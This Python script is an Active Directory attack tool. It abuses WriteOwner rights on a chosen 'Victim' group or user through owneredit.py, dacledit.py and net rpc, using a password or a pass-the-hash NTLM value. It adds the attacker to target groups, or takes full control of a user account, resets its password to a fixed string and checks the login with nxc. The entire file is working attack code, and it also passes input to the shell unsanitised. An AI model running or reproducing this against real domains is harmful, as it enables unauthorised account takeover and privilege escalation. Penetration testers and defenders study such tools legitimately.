import os
import subprocess
from argument_parser import parse_arguments  # Import the parse_arguments function from argument_parser.py

# Install missing dependencies if necessary
try:
    from colorama import Fore
except ImportError:
    os.system("sudo pip install colorama")

# Set colorama color constants
RED = Fore.RED
YELLOW = Fore.YELLOW
GREEN = Fore.GREEN
MAGENTA = Fore.MAGENTA
BLUE = Fore.BLUE
CYAN = Fore.CYAN
RESET = Fore.RESET

def whois():
    """Prompt user to choose between group (g) or user (u)"""
    who = input(f"{CYAN}Write owner over group or user (g/u):{RED} ").strip().lower()
    return who  # Return the input value

def WOhashG(DOMAIN, USER, HASH):
    """Write owner over group with hashes"""
    tar = input(f"{CYAN}Victim:{RED} ")
    subprocess.call([f"{RESET}"], shell=True)
    subprocess.call([f"owneredit.py -action write -owner {USER} -target {tar} {DOMAIN}/{USER} -hashes 00000000000000000000000000000000:{HASH}"], shell=True)
    subprocess.call([f"dacledit.py -action 'write' -rights 'WriteMembers' -principal {USER} -target {tar} {DOMAIN}/{USER} -hashes 00000000000000000000000000000000:{HASH}"], shell=True)
    subprocess.call([f"pth-net rpc group addmem {tar} {USER} -U {DOMAIN}/{USER}%00000000000000000000000000000000:{HASH} -S {DOMAIN}"], shell=True)
    subprocess.call([f"pth-net rpc group members {tar} -U {DOMAIN}/{USER}%00000000000000000000000000000000:{HASH} -S {DOMAIN}"], shell=True)

def WOpassG(DOMAIN, USER, PASS):
    """Write owner over group with password"""
    tar = input(f"{CYAN}Victim:{RED} ")
    subprocess.call([f"{RESET}"], shell=True)
    subprocess.call([f"owneredit.py -action write -owner {USER} -target {tar} {DOMAIN}/{USER}:{PASS}"], shell=True)
    subprocess.call([f"dacledit.py -action 'write' -rights 'WriteMembers' -principal {USER} -target {tar} {DOMAIN}/{USER}:{PASS}"], shell=True)
    subprocess.call([f"net rpc group addmem {tar} {USER} -U {DOMAIN}/{USER}%{PASS} -S {DOMAIN}"], shell=True)
    subprocess.call([f"net rpc group members {tar} -U {DOMAIN}/{USER}%{PASS} -S {DOMAIN}"], shell=True)

def WOpassU(DOMAIN, USER, PASS):
    """Write owner over user with password"""
    tar = input(f"{CYAN}Victim:{RED} ")
    subprocess.call([f"{RESET}"], shell=True)
    subprocess.call([f"owneredit.py -action write -new-owner {USER} -target {tar} {DOMAIN}/{USER}:{PASS}"], shell=True)
    subprocess.call([f"dacledit.py -action 'write' -rights 'FullControl' -principal {USER} -target {tar} {DOMAIN}/{USER}:{PASS}"], shell=True)
    print(f"{YELLOW}Changing {tar} password to P@ssw0rd123!@#")
    subprocess.call([f"net rpc password {tar} 'P@ssw0rd123!@#' -U {DOMAIN}/{USER}%{PASS} -S {DOMAIN}"], shell=True)
    subprocess.call([f"nxc smb {DOMAIN} -u {tar} -p 'P@ssw0rd123!@#'"], shell=True)

def WOhashU(DOMAIN, USER, HASH):
    """Write owner over user with hashes"""
    tar = input(f"{CYAN}Victim:{RED} ")
    subprocess.call([f"{RESET}"], shell=True)
    subprocess.call([f"owneredit.py -action write -new-owner {USER} -target {tar} {DOMAIN}/{USER} -hashes 00000000000000000000000000000000:{HASH}"], shell=True)
    subprocess.call([f"dacledit.py -action 'write' -rights 'FullControl' -principal {USER} -target {tar} {DOMAIN}/{USER} -hashes 00000000000000000000000000000000:{HASH}"], shell=True)
    print(f"{YELLOW}Changing {tar} password to P@ssw0rd123!@#")
    subprocess.call([f"pth-net rpc password {tar} 'P@ssw0rd123!@#' -U {DOMAIN}/{USER}%{HASH} -S {DOMAIN}"], shell=True)
    subprocess.call([f"nxc smb {DOMAIN} -u {tar} -p 'P@ssw0rd123!@#'"], shell=True)

def main():
    # Get the arguments from the argument_parser.py
    args = parse_arguments()

    # Extract arguments
    DOMAIN = args.DomainName
    USER = args.Username
    PASS = args.Password
    HASH = args.PassTheHash  

    # Capture the input from whois function
    who_choice = whois()  # Get user input and store it in a variable

    # Check if the user input is valid
    if who_choice not in ['g', 'u']:
        print(f"{RED}Invalid input! Please choose 'g' or 'u'.")
        return  # Exit the program if input is invalid

    # Execute the appropriate function based on the parsed arguments
    if HASH:
        if who_choice == "g":
            WOhashG(DOMAIN, USER, HASH)
        else:
            WOhashU(DOMAIN, USER, HASH)
    else:
        if who_choice == "g":
            WOpassG(DOMAIN, USER, PASS)
        else:
            WOpassU(DOMAIN, USER, PASS)

if __name__ == '__main__':
    main()
